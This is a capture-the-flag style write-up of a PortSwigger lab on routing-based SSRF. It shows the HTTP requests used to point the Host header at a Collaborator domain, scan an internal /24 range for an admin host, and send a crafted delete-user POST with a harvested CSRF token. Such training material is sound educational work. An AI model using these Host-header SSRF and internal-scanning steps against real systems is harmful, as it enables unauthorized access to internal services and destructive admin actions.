## Lab Description :

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/b36e6b1c-36bb-4b97-97aa-593aa31696ba)

## Overview :

- Routing-based SSRF relies on exploiting the intermediary components that are prevalent in many cloud-based architectures. This includes in-house load balancers and reverse proxies.

- Although these components are deployed for different purposes, fundamentally, they receive requests and forward them to the appropriate back-end. If they are insecurely configured to forward requests based on an unvalidated Host header, they can be manipulated into misrouting requests to an arbitrary system of the attacker's choice.

> These systems make fantastic targets. They sit in a privileged network position that allows them to receive requests directly from the public web, while also having access to much, if not all, of the internal network. This makes the Host header a powerful vector for SSRF attacks, potentially transforming a simple load balancer into a gateway to the entire internal network. 

- You can use Burp Collaborator to help identify these vulnerabilities. If you supply the domain of your Collaborator server in the Host header, and subsequently receive a DNS lookup from the target server or another in-path system, this indicates that you may be able to route requests to arbitrary domains.

- Having confirmed that you can successfully manipulate an intermediary system to route your requests to an arbitrary public server, the next step is to see if you can exploit this behavior to access internal-only systems.

## Solution :

Send the **GET /** to repeater tab.

```http
GET / HTTP/1.1
Host: 0ab100d803de32ba80009e5800e10037.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Connection: close
Cookie: session=Ackhz74PL40FPRCdQ57VnUQ4hnqJticB; _lab=47%7cMC0CFQCSkeO6IVrR5bWOnHC67pwNtNr%2bhgIUYDlr183TQWtxVBTVtEgHh2HsPWSw0oREPi64wCVkO8sGYJnCCjiWxSZ77Nb6uL50%2f2%2bW88EC5mTBrnauYKgKoVogt2TH%2bMe2SxPdlzhQu2ZqH%2bHIMIJRe%2beryggmPWfRwV1iLYgkRslG
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
```

In the **Host** header, insert burp collaborator address & send the request.

**Request -**
```http
GET / HTTP/1.1
Host: m2wzlmhiz55309u64yt5717bai1oscp0e.oastify.com
```

**Response -**
```http
HTTP/1.1 200 OK
Server: Burp Collaborator https://burpcollaborator.net/
X-Collaborator-Version: 4
Content-Type: text/html
Connection: close
Content-Length: 475

<html><body>biooafyqnymp2kzz6os2vzzjjgpgz9m4zi1j2rvsaedk86w16c9zjklgz9m4zi1j2rvsaedk86w16c9zjjugz9m4zi1j2rvsaedk86w16c9zjjtgz9m4zi1j2rvsaedk86w16c9zjjvgz9m4zi1j2rvsaedk86w16c9zjjwgz9m4zi1j2rvsaedk86w16c9zjjxgz9m4zi1j2rvsaedk86w16c9zjkigz9m4zi1j2rvsaedk86w16c9zjkjgz9m4zi1j2rvsaedk86w16c9zjkkgz9m4zi1j2rvsaedk86w16c9zjkmgz9m4zi1j2rvsaedk86w16c9zjkngz9m4zi1j2rvsaedk86w16c9zjkogz9m4zi1j2rvsaedk86w16c9zjkogz9m4zi1j2rvsaedk86w16c9zjkogz9m4zi1j2rvsaedk86w16c9zjkpgz</body></html>
```

From the response we can understand that it worked ! 

From the collaborator , we can see that there are few hits . 

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/58ee7740-a6b3-4c92-8d88-e42333d9b55b)

The IP in the request is an indicator that we are indeed able to make the middlebox (Reverse-proxy/load-balancer) to make request to our colab server.

### Routing-based SSRF -

Now we need to check if we could try & access internal IP addresses.

> Lab description says that the CIDR range is **192.168.0.0/24**

**/24** means there might me maximum 254 hosts.

Send the request to intruder & add the last octet as the payload position .

```http
GET / HTTP/1.1
Host: 192.168.0.§0§
```

> Untick the **Update host header to match target** option so that each time when the request is sent, it wont change back to websecurity.net & will remain as 192.168.0.x

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/be510b7e-fb5a-45cb-92e1-4b9ae78503d9)

Select payload type as ***numbers** & select the range from 2 to 254.

Start the attack.

Once the attack is complete, we can see that one IP address has a **302 redirect to /admin** 

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/ae5e31ac-52e3-4ca7-a114-2b3bde2f09b9)

So now we have the internal IP address which automatically routes to /admin panel - **192.168.0.175**

Send the *GET* request to /admin to repeater tab with the host being set to 192.168.0.175.

In the response we can see that there is an form option to delete a user & along with a **CSRF TOKEN**.

```html
<form style='margin-top: 1em' class='login-form' action='/admin/delete' method='POST'>
    <input required type="hidden" name="csrf" value="02wWDc9cloXK2xxpfMxjvUfTiQ3BDzJ4">
       <label>Username</label>
    <input required type='text' name='username'>
       <button class='button' type='submit'>Delete user</button>
</form>
```

Now craft a POST request to /admin/delete with the username to delete & add the csrf token with the request

```
POST /admin/delete HTTP/1.1
Host: 192.168.0.175
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@59cm3yso1fbeeew0hsx61ffzwq2iv6k.oastify.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab100d803de32ba80009e5800e10037.web-security-academy.net/
.
.
.
username=carlos&csrf=02wWDc9cloXK2xxpfMxjvUfTiQ3BDzJ4
```

Now the user carlos is deleted & we've solve the lab.

![image](https://github.com/sh3bu/Portswigger_labs/assets/67383098/3d86ab6a-2b4e-40f7-a068-b815088e0254)
